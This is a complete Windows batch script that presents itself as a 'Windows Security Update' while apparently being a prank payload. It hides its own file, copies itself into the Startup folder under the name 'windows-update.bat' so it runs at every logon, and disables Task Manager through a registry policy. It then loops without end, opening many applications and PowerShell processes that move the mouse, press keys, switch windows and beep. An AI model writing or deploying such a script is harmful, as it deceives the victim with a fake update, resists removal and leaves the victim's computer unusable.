@echo off
title Windows Security Update
color 0A
mode con: cols=40 lines=10
echo Installing security patch...
timeout /t 3 /nobreak >nul
cls

:: Hide the script
attrib +h "%~f0"

:: Copy itself to startup
set scriptName=prank.bat
set destFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%destFolder%\windows-update.bat" /Y

:: Disable Task Manager to prevent closing
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Infinite loop for maximum annoyance
:loop
:: Open tons of applications
start notepad
start calc
start mspaint
start cmd
start explorer
start control panel
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://google.com
start taskmgr
start devmgmt.msc
start powershell -Command "$wshell = New-Object -ComObject wscript.shell; while ($true) { $wshell.SendKeys('{TAB}'); Start-Sleep -Milliseconds 50 }"

:: Random mouse movement
powershell -Command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int X, int Y); }'; while ($true) { [Mouse]::SetCursorPos((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080)); Start-Sleep -Milliseconds 50 }}"

:: Random key presses (Caps Lock, Enter, etc.)
powershell -Command "& {while ($true) { $wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 0.5; $wshell.SendKeys('{ENTER}'); Start-Sleep -Milliseconds 0.5 }}"

:: Screen flicker effect
powershell -Command "& {while ($true) { [console]::beep(500,100); Start-Sleep -Milliseconds 100; (New-Object -ComObject WScript.Shell).SendKeys('%{TAB}'); Start-Sleep -Milliseconds 100 }}"

:: Change wallpaper repeatedly
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\System32\oobe\info\backgrounds\backgroundDefault.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True

:: Beep noises for extra annoyance
powershell -Command "& {while ($true) { [console]::beep((Get-Random -Minimum 200 -Maximum 800), 200); Start-Sleep -Milliseconds 100 }}"

:: Prevent the script from stopping
goto loop

